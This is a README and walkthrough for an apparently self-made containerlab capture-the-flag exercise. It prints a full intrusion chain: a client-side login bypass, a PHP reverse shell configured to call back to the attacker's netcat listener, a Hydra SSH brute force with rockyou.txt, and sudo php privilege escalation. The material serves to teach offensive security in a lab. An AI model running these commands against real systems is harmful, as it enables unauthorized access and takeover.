# network-ctf
Dependencies:
    - Apache2
    - Containerlab
    - Docker

# Walkthrough
### <b>Step 1:</b> Deployment
Run the following commands:
```bash
git clone https://github.com/npmaharaj1/network-ctf # Clone the ctf repo
cd network-ctf # Enter repo directory
sudo containerlab deploy -t clab_topology.yml # Deploy the containerlab topology
```

### <b>Step 2:</b> Attack
Run the following command to enter the worker504 bash environment (which will be our starting point)
```bash
sudo docker exec -it clab-network-ctf-worker504 bash
```

To start off with, we'll look in our home directory. We as the attackers already have full access to the system (root). Here's the topology of our environment from some previous enumeration.
<img src="/assets/readme/topology.png"> 

Our end goal is to reach the IT admin computer, to do so it looks like we'll have to go through a few computers first.

Lets look at the device we already have full access to (worker504) and see if we find anything that might be useful.
```bash
ls
```
There seems to be a file in the root directory named managerlist.txt. Let's open it and see what's inside
```bash
cat managerlist.txt

shiftmanager002 > localhost:8132
```
It looks like the manager has left a file that is most likely intended for the original owner of the office computer. That's okay though since it looks like that it's telling us where to go next. Let's open our browser and go to localhost:8132 and see what's happening there.

<img src="/assets/readme/permissiondenied.png">

It looks like we immedietly get redirected to a permission denied page. Even if we go its parent, the redirection still occurs. This most likely means that we'll need to hack into this manager web portal thing. Let's start off by going to the login page at the top right and try some common credentials...

...to no avail. It seams that while the websites page is exposing itself, it still has some layer of protection. Let's look at the pages javascript code and see if there's anything valuable
```
Press the F12 key or CTRL + SHIFT + I combination to open the inspector console and go to the "Debugger" tab > Main Thread > localhost:8132 > login > script.js. After some analysis, it looks like whoever set up this authentication portal, didn't use server side authentication and instead used client side.
```

<b><i>Client side authentication vs Server side authentication. What is it and why does it matter?</i></b><br>
There are two ways of authentication in modern systems. As said above they can either be validated on the client side or server side. Server side authentication occurs when the user enters the login data and sends it to the server for processing which means that the client (whoever is using the website) cannot see the result until the results from the server are sent back. Client side authentication is when the client (person using the website) validates the data and lets itself it. A simpler analogy is someone going to a friends house. Server side authentication can be though of going to the friends house and asking if they can come in. If the friend says yes, they can enter. However client side authentication is when the person goes to the friends house and goes "yeah I'm his friend, I'm going to let myself in".

In this case, the login page is using client side authentication. We can tell because the if condition on line one is checking if a variable in local storage equals a value. To exploit this vulnerability, we can modify our own local storage values to have the website let us in.

To do this:
```
In the navigation bar of the inspect element panel, go to Storage > Local Storage > http://localhost:8132. In the center panel, it says that theres no data. That's why the page isn't letting us in so lets fix that. Go to the top right and tap the + button and change the key to "verified" and the value to 1. We can close the inspector now.
```
In theory, this means that if we reload, the page will check our local storage values and see the verified == 1 and in turn, let us in. Lets try it.

<img src="/assets/readme/landing.png">

And we're in. Let's take a look around. It seems that this page simply is an admin dashboard that someone like a manager would see comfort in. On the top right profile dropdown, we can see a diary which has something in it. Let's open that.

<img src="/assets/readme/diary.png">

Having a quick read through the diary entry, we are given some valuable information that we might be able to use later (<i>hint hint cough cough</i>). Let's write these down.

```
1.) The IT admin probably uses an insecure password (like the rest of the workers in the company)
2.) The IT admin as a dhcp setup so we don't need to know his ip address. We can instead use it's english name: mauricemosscomputer
```

It seems this is all we can gather form the diary entry. However, there was also an inbox button, lets go have a look at that.

<img src="/assets/readme/inbox.png">

It does look like there's some unread mail, lets read it and add a few things to our notes.

```
1.) The IT admin probably uses an insecure password (like the rest of the workers in the company)
2.) The IT admin as a dhcp setup so we don't need to know his ip address. We can instead use it's english name: mauricemosscomputer
3.) There is a new file transfer program that has been installed (will need to look at)
4.) IP Address of the server is 192.168.1.98
5.) Employees are putting computer passwords on sticky notes
```

Looks like the only valuable thing to be gained from this page is the new filetransfer program. Let's take a look at that by clicking the link.

<img src="/assets/readme/filefusion.png">

Filefusion is a cool name. When we press get started we're greeted immediate access to the program.
In cybersecurity, the most common exploit for file uploads is the simply php reverse shell.
<b><i>How does this work?</i></b>
To break this down simply, php is a programming language that provides code to a website for further functionality such as execute system commands. A reverse shell is a technique in cybersecurity to gain access to a server without needing to bypass the firewall. The image below should explain it.

<img src="https://cyberphinix.de/enydrirs/2024/08/How-a-Reverse-Shell-works.png">

As we can see from the image above, if a computer from the outside world were to try and connect into this system, the firewall would stop it. However, if the target computer from inside the network were to make a request to the outside world, the firewall would allow it since it is assuming that that is what you want to do. For us, this is good but for the vicitim... It's not great.

Let's make a reverse shell script to gain access to this server's backend.

To make this easier we can go to google and simply download one. <a href"https://github.com/pentestmonkey/php-reverse-shell">This one from pentest monkey will do fine</a>

Let's open this file and change a few things, to be specific, we are going to change the IP Address and the socket port number as shown below.

```
$VERSION = "1.0";
$ip = '192.168.1.23';  // THE IP ADDRESS OF OUR LOCAL SYSTEM (WORKER 504) THIS WILL BE 192.168.1.23
$port = 4444;          // WE WILL BE USING PORT 4444 SINCE IT IS A STANDARD
$chunk_size = 1400;
```

Now that we have our reverse shell file telling the computer where to connect to, let's setup a socket for the signal to go for us to control the server.

On our system (the worker504 computer), enter the following command:
```bash
nc -nlvp 4444
```

nc, or netcat, is the program we will be using to process the request from the file server, -nlvp means the following
    - n: ip addresses only, only accept connections from ip addresses
    - l: listen mode, wait for inbound connections, this is useful for us since the server will be connecting to us
    - v: verbose mode, the system will tell us everything that is happening
    - p: specify the port to listen on, since we specified 4444 in the file, we'll use 4444 here

You should get the following prompt back signalling success:

```
listening on [any] 4444 ...
```

Now that we have a listener, let's tell the server to connect to us and hack this thing!
```
On filefusion (the website), let's go through the steps and upload a file.
In the url bar, change the /upload to /uploads to view the uploaded files
We should see a link with the same filename as the file we uploaded, to get the server to execute the malicious php code, we just have to simply click the link.
The website should hang (not do anything and keep loading), this isn't broken, it just means that it's still processing the request which is good because if we navigate to our worker504 machine which is running our netcat listener, we'll see the following:

connect to [192.168.1.23] from (UNKNOWN) [192.168.1.98] 57972
Linux companyserver 6.11.7-2-cachyos #1 SMP PREEMPT_DYNAMIC Fri, 08 Nov 2024 19:19:03 +0000 x86_64 x86_64 x86_64 GNU/Linux
 09:39:45 up  3:08,  0 user,  load average: 0.28, 0.20, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
#
```

We've successfully hacked the server!
First things first, let's fix our input, because we just exploited a web vulnerability, we'll need to make our new shell a bit more stable. We can do this by started a python input:
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```
We should see that the terminal looks a little more familiar since it now looks similar to the worker504 command line.
<b><i>What now?</i></b><br>
Well lets do the same thing we did to start with, let's look around and see what's different.
```bash
ls
```
It looks like we're in a regular filesystem however there's an extra directory. Namely, the assets directory. That's not normally there in modern linux distrobutions so let's have a look inside it

```bash
cd assets
ls
```

It looks like these are files that this mauricemoss person must have been looking at. If we look at our notes we see that employees of this company have been using insecure passwords which is interesting because there's a rockyou.txt file right here. For context, rockyou.txt is a massive database of commonly used passwords which date back years. There are 14344391 passwords in this file however in most cases they are condensed for simplicity. the login.txt seems to also have a file full of usernames with something to do with mauricemoss himself. There is a high likelyhood that these are past usernames. According to our notes from earlier as well, there seems to be a strong possibility that mauricemoss uses an insecure password. Putting these facts together leads to the idea that maybe we can brute force the login to mauricemoss's computer. How would we do this? Hydra of course:

<b><i>What is Hydra you might ask?</i></b><br>
Hydra is a tool in linux to brute force passwords. Brute forcing a password in cybersecurity can be thought of trying to log into someones phone. First you try 0000, then you try 0001, then 0002 then 0003 and so on. Doing this ourselves can be annoying especially since there are letters so we use a tool like hydra to do this for us.

However, before we use hydra we need to make sure our terminal can handle a tool like Hydra. to elborate the Hydra output likes to output colours so it needs to know what kind of terminal we are using to do so. Because we are running our commands in an unstable interface, we need to tell it ourselves. It's pretty easy though all we have to do is input the following command
```bash
export TERM=xterm-256color
```
Now Hydra knows that we are using the xterm-256color terminal and will work when we use it.

To activate Hydra, run the following command:
```bash
hydra -I -V -F -L login.txt -P rockyou.txt ssh://mauricemosscomputer
```

-I: Ignore previous runs (do not resume)
-V: Verbose, tell us what's happening
-F: Exit program when login and password is found
-L: Specify login list, try all logins in the list
-P: Specify password list, try all passwords in the list
ssh://: Specify the ssh protocol
mauricemosscomputer: The dhcp name for the computer, we found this in the inbox and wrote in in our notes.

There will be a lot of output telling us the credentials that it is trying. Since this is a brute force attack it might take some time for it to find an answer so all we have to do is wait for it and see if it's successful.

A few minutes later, some green text appears saying that it's found the username password pair.
```
mauricemoss:pookie
```

We can now go ahead to connecting to the IT Admin computer now that we know the ssh details. However before we get to that, <b><i>What is ssh?</i></b>

Secure shell, also knows as ssh can be thought as a messaging service between a user and their computer. Sort of like the remote desktop protocol but for only the command line.

Let's connect to the it admin computer with the credentials we have just found
```bash
ssh mauricemoss@mauricemosscomputer
password: pookie
```

We'll be greeted with the ubuntu stock welcome page and we now have access to the administrator's computer.
But what if we can get administrator on the administrator computer...?
Why not let's do it.

In cybersecurity, breaking into the administrator or <i>root</i> account is called privilage escelation. Our objective is to privilage escelate on this it admin computer so we have complete access to the entire network infrustucture.
A common way to privilage escelate is to check what commands can be ran as sudo. Let's find out
```bash
sudo -l

Matching Defaults entries for mauricemoss on itadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mauricemoss may run the following commands on itadmin:
    (ALL) NOPASSWD: /usr/bin/php
```

See the line that says (ALL) NOPASSWD, this means that the mauricemoss can run phpas sudo on this computer. Let's spawn a shell
```bash
sudo php -r "system('/bin/bash');"
```
What does this command do?
    -r: run, run php code from standard in (stdin)
    - system(): tell php to run the system function to execute system commands
    - /bin/bash: The command to execute, in this case, the bash command in location /bin/
Therefore, this command will execute /bin/bash which will spawn a new shell. However, since we are running this command as sudo, the root user will be executing this instead of us, meaning that our shell will privilage escelate.

```
root@mauricemosscomputer$
```
We now have root. We can tell by executing the
```
whoami
```
command which will return our user.

Now that we have root, we now have complete access to the company infrustucture. Let's prove that we've pwned this system by looking for the root flag. 
Pretty much the only directory on any linux system that is restricted for regular users, is the /root directory so lets look in there.
```bash
cd /root
ls

secure.tar.gz
```

It does look like there's a tar archive here named secure... How suspicious.
Let's "unzip this"
```bash
tar -xf secure.tar.gz
ls
```

Look! Another directory, let's go in there
```
cd root
ls
```

There's the flag, print it
```bash
cat flag.txt
```

Magic!
